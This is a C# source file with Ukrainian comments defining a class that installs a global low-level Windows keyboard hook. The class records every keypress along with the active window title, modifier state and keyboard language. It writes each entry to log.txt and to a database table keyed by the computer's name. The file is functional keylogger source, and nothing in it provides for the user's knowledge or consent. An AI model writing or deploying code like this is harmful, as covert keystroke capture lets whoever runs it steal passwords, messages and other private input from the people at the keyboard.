using System;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using ListenerDatabase;
using ListenerDatabase.Models;

namespace Last5Launching
{
    public class MyKeyboardListener
    {
        const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private IntPtr _hookPtr = IntPtr.Zero;
        private readonly KeyboardHookDelegate handler;
        private readonly AppDbContext _dbContext; // Контекст бази даних

        public MyKeyboardListener(AppDbContext dbContext)
        {
            handler = KeyboardHandler;
            _dbContext = dbContext; // Передаємо контекст бази даних
        }

        delegate IntPtr KeyboardHookDelegate(int code, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        static extern IntPtr SetWindowsHookEx(int hookId, KeyboardHookDelegate del, IntPtr hmod, uint idThread);

        [DllImport("user32.dll")]
        static extern bool UnhookWindowsHookEx(IntPtr pHook);

        [DllImport("user32.dll")]
        static extern IntPtr CallNextHookEx(IntPtr pHook, int code, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        [DllImport("user32.dll")]
        private static extern int GetWindowTextLength(IntPtr hWnd);

        [DllImport("user32.dll")]
        private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

        [DllImport("user32.dll")]
        private static extern short GetKeyState(int nVirtKey);

        [DllImport("user32.dll")]
        private static extern IntPtr GetKeyboardLayout(uint idThread);

        public void SetHook()
        {
            _hookPtr = _setHook(handler);
        }

        public void UnsetHook()
        {
            UnhookWindowsHookEx(_hookPtr);
        }

        private IntPtr _setHook(KeyboardHookDelegate del)
        {
            var process = Process.GetCurrentProcess();
            var module = process.MainModule;
            return SetWindowsHookEx(WH_KEYBOARD_LL, del, GetModuleHandle(module.ModuleName), 0);
        }

        private static string GetCurrentWindowTitle()
        {
            IntPtr handle = GetForegroundWindow();
            int length = GetWindowTextLength(handle);
            StringBuilder stringBuilder = new StringBuilder(length + 1);
            GetWindowText(handle, stringBuilder, stringBuilder.Capacity);
            return stringBuilder.ToString();
        }

        private static bool IsKeyPressed(int key)
        {
            short keyState = GetKeyState(key);
            return (keyState & 0x8000) != 0;
        }

        private static bool IsKeyToggled(int key)
        {
            short keyState = GetKeyState(key);
            return (keyState & 0x0001) != 0;
        }

        IntPtr KeyboardHandler(int code, IntPtr wParam, IntPtr lParam)
        {
            if (code >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                var keyCode = (Keys)Marshal.ReadInt32(lParam);
                bool shiftPressed = IsKeyPressed((int)Keys.ShiftKey);
                bool capsLockState = IsKeyToggled((int)Keys.CapsLock);

                string windowTitle = GetCurrentWindowTitle();
                string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
                string languageCode = GetCurrentLanguageCode();

                string logEntry = $"[{timestamp}] Window: '{windowTitle}' | Key: {keyCode} | " +
                                  $"Shift: {(shiftPressed ? "Pressed" : "Not Pressed")} | " +
                                  $"CapsLock: {(capsLockState ? "On" : "Off")} | " +
                                  $"Language: {languageCode}";

                // Логування у файл
                try
                {
                    File.AppendAllText("log.txt", logEntry + Environment.NewLine);
                }
                catch (IOException ex)
                {
                    Debug.WriteLine($"Error writing to log file: {ex.Message}");
                }

                // Збереження у базу даних
                SaveKeyPressToDatabase(logEntry);
            }

            return CallNextHookEx(_hookPtr, code, wParam, lParam);
        }

        private string GetCurrentLanguageCode()
        {
            var threadId = GetWindowThreadProcessId(GetForegroundWindow(), out _);
            var keyboardLayout = GetKeyboardLayout(threadId);
            int cultureId = keyboardLayout.ToInt32() & 0xFFFF;
            var cultureInfo = new CultureInfo(cultureId);
            return cultureInfo.TwoLetterISOLanguageName.ToUpper();
        }

        private void SaveKeyPressToDatabase(string keyPressed)
        {
            try
            {
                string computerName = Environment.MachineName;

                // Отримуємо користувача
                var user = _dbContext.Users.FirstOrDefault(u => u.ComputerName == computerName);
                if (user == null)
                {
                    // Якщо користувач не існує, створюємо нового
                    user = new User { ComputerName = computerName };
                    _dbContext.Users.Add(user);
                    _dbContext.SaveChanges();
                }

                // Додаємо запис про натискання клавіші
                var keyLog = new KeyLog
                {
                    KeyPressed = keyPressed,
                    Timestamp = DateTime.Now,
                    UserId = user.UserId
                };

                _dbContext.KeyLogs.Add(keyLog);
                _dbContext.SaveChanges();

                Console.WriteLine($"Клавіша '{keyPressed}' збережена у базу.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Помилка при збереженні клавіші у базу: {ex.Message}");
            }
        }
    }
}
